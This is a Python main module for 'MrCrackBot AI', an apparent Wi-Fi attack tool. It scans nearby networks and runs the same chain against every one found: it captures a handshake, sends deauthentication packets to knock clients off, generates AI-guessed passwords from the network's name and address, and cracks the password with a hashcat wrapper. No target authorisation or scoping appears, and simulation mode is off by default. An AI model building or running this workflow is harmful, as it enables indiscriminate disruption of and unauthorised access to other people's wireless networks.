"""
MrCrackBot AI - Main Module
Handles core functionality and workflow management.
"""

from __future__ import annotations

import argparse
import asyncio
import inspect
import logging
import os
import signal
from contextlib import asynccontextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

import aiofiles

from ai.feature_extractor import extract_features
from ai.password_model import generate_password_guesses
from cracking.hashcat_wrapper import crack_password
from network.deauth import deauth_attack
from network.handshake import capture_handshake
from network.scanner import scan_networks
from ui.intro import run_intro
from ui.main_window import MainWindow
from utils.config import Config, ensure_directories

logging.basicConfig(
    filename="mr_crackbot_ai.log",
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


def use_combined_wordlist() -> str:
    """Return path to the combined RockYou wordlist (creates parent dirs if needed)."""
    path = Path(Config.get_combined_wordlist_path())
    path.parent.mkdir(parents=True, exist_ok=True)
    if not path.is_file():
        path.write_text("password\nadmin1234\nwelcome1\n", encoding="utf-8")
    return str(path)


@dataclass
class NetworkTarget:
    ssid: str
    bssid: str
    channel: int
    handshake_file: Optional[str] = None
    wordlist_file: Optional[str] = None


class CrackBotCore:
    def __init__(self, config: Config) -> None:
        self.config = config
        self.progress_callback: Optional[Callable] = None
        self.retry_count = 3
        self.retry_delay = 2

    async def update_progress(self, stage: str, progress: float, message: str) -> None:
        if self.progress_callback:
            await self.progress_callback(stage, progress, message)
        logger.info("%s: %s (%.0f%%)", stage, message, progress)

    @asynccontextmanager
    async def resource_manager(self, resource_type: str):
        try:
            logger.info("Acquiring %s resources", resource_type)
            yield
        finally:
            logger.info("Cleaning up %s resources", resource_type)
            if resource_type == "temp_files":
                await self.cleanup_temp_files()

    async def retry_operation(self, operation: Callable, *args: Any):
        last_error: Optional[Exception] = None
        for attempt in range(self.retry_count):
            try:
                if inspect.iscoroutinefunction(operation):
                    return await operation(*args)
                return await asyncio.to_thread(operation, *args)
            except Exception as exc:
                last_error = exc
                delay = self.retry_delay * (2**attempt)
                logger.warning("Operation failed: %s. Retrying in %ss...", exc, delay)
                await asyncio.sleep(delay)
        raise RuntimeError(f"Operation failed after {self.retry_count} attempts: {last_error}")

    async def scan_networks_async(self) -> List[NetworkTarget]:
        async with self.resource_manager("network_scan"):
            networks = await self.retry_operation(scan_networks)
            return [
                NetworkTarget(
                    ssid=network["ssid"],
                    bssid=network["bssid"],
                    channel=int(str(network["channel"]).strip() or "6"),
                )
                for network in networks
            ]

    async def process_network(self, target: NetworkTarget) -> None:
        async with self.resource_manager("network_processing"):
            target.handshake_file = await self.retry_operation(
                capture_handshake, target.bssid, target.channel
            )

            await self.update_progress("deauth", 0, f"Starting deauth on {target.ssid}")
            await self.retry_operation(deauth_attack, target.bssid)

            features = await self.retry_operation(extract_features, target.ssid, target.bssid)
            target.wordlist_file = await self.generate_wordlist(target, features)
            await self.crack_password_async(target)

    async def generate_wordlist(self, target: NetworkTarget, features: Dict) -> str:
        metadata = {
            "ssid": target.ssid,
            "bssid": target.bssid,
            "parameters": features,
        }
        wordlist = await self.retry_operation(generate_password_guesses, metadata)
        wordlist_file = Path(self.config.TEMP_DIRECTORY) / f"wordlist_{target.bssid.replace(':', '')}.txt"
        wordlist_file.parent.mkdir(parents=True, exist_ok=True)
        async with aiofiles.open(wordlist_file, "w", encoding="utf-8") as handle:
            await handle.write("\n".join(wordlist))
        return str(wordlist_file)

    async def crack_password_async(self, target: NetworkTarget) -> None:
        combined_wordlist = use_combined_wordlist()

        def _progress(value: int) -> None:
            logger.info("Cracking progress: %s%%", value)

        await self.retry_operation(
            crack_password,
            target.handshake_file,
            combined_wordlist,
            _progress,
        )

    async def cleanup_temp_files(self) -> None:
        temp_dir = Path(self.config.TEMP_DIRECTORY)
        if not temp_dir.exists():
            return
        for file in temp_dir.glob("*"):
            try:
                file.unlink()
            except OSError as exc:
                logger.error("Failed to cleanup %s: %s", file, exc)


async def main_async(skip_intro: bool = False, headless: bool = False) -> None:
    config = Config()
    config.load_from_file("config.yaml")
    ensure_directories()

    core = CrackBotCore(config)

    if not skip_intro:
        await asyncio.to_thread(run_intro)

    try:
        networks = await core.scan_networks_async()
        for network in networks:
            await core.process_network(network)
    except Exception as exc:
        logger.error("Workflow error: %s", exc)
    finally:
        await core.cleanup_temp_files()

    if headless:
        return

    app = MainWindow(core)
    await app.run_async()


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Mr. CrackBot AI Nano")
    parser.add_argument(
        "--simulation",
        action="store_true",
        help="Lab mode: no airodump/hashcat hardware required",
    )
    parser.add_argument("--skip-intro", action="store_true", help="Skip pygame splash")
    parser.add_argument("--headless", action="store_true", help="Run workflow without Tk UI")
    return parser


def main() -> int:
    args = build_parser().parse_args()
    if args.simulation:
        os.environ["MR_CRACKBOT_SIMULATION"] = "1"
    if args.skip_intro:
        os.environ["MR_CRACKBOT_SKIP_INTRO"] = "1"

    def _handle_sig(*_sig: object) -> None:
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, _handle_sig)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _handle_sig)

    try:
        asyncio.run(
            main_async(
                skip_intro=args.skip_intro or os.environ.get("MR_CRACKBOT_SKIP_INTRO") == "1",
                headless=args.headless,
            )
        )
    except KeyboardInterrupt:
        return 0
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
